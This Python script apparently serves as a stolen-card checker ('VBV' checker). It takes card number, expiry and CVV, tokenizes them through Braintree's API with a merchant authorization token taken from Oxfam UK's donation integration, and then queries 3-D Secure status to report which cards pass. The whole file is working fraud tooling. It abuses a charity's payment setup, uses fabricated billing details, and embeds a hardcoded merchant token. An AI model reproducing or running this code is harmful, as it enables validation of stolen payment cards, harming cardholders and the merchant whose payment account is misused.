import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def vbv(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	import requests
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk5Njg4ODksImp0aSI6ImJmZmQ4ZTJmLTE4MDgtNDc3ZS1hNGJjLTc1M2MyOWNlZGY2NyIsInN1YiI6IjI3cTQ0a3M3NHlyMjViMmYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI3cTQ0a3M3NHlyMjViMmYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoib3hmYW1HQlAifX0.fDhx5H2hhYnK9sp-JUCdEEjW6-DTKMxCsdfN3vef-4D5traGYIteOcnymlXlfz5gsOiJ6pRMbNAIU_UzCghsiQ',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'f740a5af-c94a-40b9-aba2-776ab4f8696b',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'fargeshc mohhamed',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	json_data = {
	    'amount': '10.00',
	    'additionalInfo': {
	        'billingLine1': '10080 Gulf Blvd',
	        'billingLine2': '',
	        'billingCity': 'Saint Petersburg',
	        'billingPostalCode': '33706-3256',
	        'billingCountryCode': 'US',
	        'billingPhoneNumber': '3134567812',
	        'billingGivenName': 'fargeshc',
	        'billingSurname': 'mohhamed',
	        'email': 'hddbcdu@gmail.com',
	    },
	    'bin': '535487',
	    'dfReferenceId': '1_0e23e7ef-e32c-44bf-90bd-365acf5e5250',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.76.4',
	        'cardinalDeviceDataCollectionTimeElapsed': 457,
	        'issuerDeviceDataCollectionTimeElapsed': 4371,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk5Njg4ODksImp0aSI6ImJmZmQ4ZTJmLTE4MDgtNDc3ZS1hNGJjLTc1M2MyOWNlZGY2NyIsInN1YiI6IjI3cTQ0a3M3NHlyMjViMmYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI3cTQ0a3M3NHlyMjViMmYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoib3hmYW1HQlAifX0.fDhx5H2hhYnK9sp-JUCdEEjW6-DTKMxCsdfN3vef-4D5traGYIteOcnymlXlfz5gsOiJ6pRMbNAIU_UzCghsiQ',
	    'braintreeLibraryVersion': 'braintree/web/3.76.4',
	    '_meta': {
	        'merchantAppId': 'www.oxfam.org.uk',
	        'platform': 'web',
	        'sdkVersion': '3.76.4',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'f740a5af-c94a-40b9-aba2-776ab4f8696b',
	    },
	}

	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/27q44ks74yr25b2f/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
